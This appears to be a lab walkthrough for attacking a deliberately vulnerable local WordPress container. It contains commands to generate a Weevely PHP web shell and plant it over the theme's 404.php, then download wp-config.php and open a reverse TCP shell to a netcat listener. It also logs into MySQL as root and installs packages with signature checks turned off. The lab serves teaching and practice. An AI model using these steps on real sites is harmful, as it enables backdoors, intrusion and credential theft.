1. Run a vulnerable Wordpress host: https://github.com/vavkamil/dvwp

```bash
git clone https://github.com/vavkamil/dvwp.git
cd dvwp
docker-compose up -d --build
docker-compose run --rm wp-cli install-wp

#docker-compose down to shut down the container
```

2. Enable 404 page

Access WP-Admin:
- Navigate to [http://localhost:31337/wp-admin](http://localhost:31337/wp-admin)
Regenerate permalinks:
- Go to **Settings â†’ Permalinks**.
- Select **Post name** and click **Save**.


3. Generate a webshell
   
- run Weevely inside the same wp netowrk `docker run --rm -it --network <NOME_NETWORK> janes/weevely bash`
- `weevely generate mypassword agent.php`

4. Overwrite 404.php in wordpress conteiner with the contents of agent.php (the code generated by weevely).
   
-  `docker cp agent.php fefea0975eb6:/var/www/html/wp-content/themes/twentytwenty`
-  rename the original 404.php to 404.bak.php
-  rename agent.php to 404.php

5. weevely connection

- start a session inside Weevely container: `weevely http://172.21.0.3/wp-content/themes/twentytwenty/404.php  mypassword`
    - to now container ip: `docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container-id>`
- interact with the web shell



6. Exploitation (command insert in weevely shell --> open two terminals)

- file_download /var/www/html/wp-config.php ./wp-config.php
- nc -lvp 8181 (first weevely terminal)
- backdoor_reversetcp 172.21.0.4 8181 (second weevely terminal)
- mysql --user=root --password=password --host=mysql (first weevely terminal)
- SHOW DATABASES;

REFERENCES:
https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/



------TRHOUBLESHOOTING------

NOTE: if you have problem with mysql client installation in Wordpress container, because of old debian version, you can fix it with the following commands:

```bash
sed -i 's|http://deb.debian.org/debian|http://archive.debian.org/debian|g' /etc/apt/sources.list
sed -i 's|http://security.debian.org|http://archive.debian.org/|g' /etc/apt/sources.list
echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
apt update
apt install -y default-mysql-client
#TEST CONNECTION
mysql --user=root --password=password --host=172.21.0.2
```
 
NOTE: if you want to use  :backdoor_reversetcp in weevely, you can install netcat in the weevely container with the following commands:

```bash
echo "deb http://archive.debian.org/debian jessie main" > /etc/apt/sources.list
echo "deb http://archive.debian.org/debian-security jessie/updates main" >> /etc/apt/sources.list
echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
apt-get update
apt-get install -y --allow-unauthenticated netcat
```
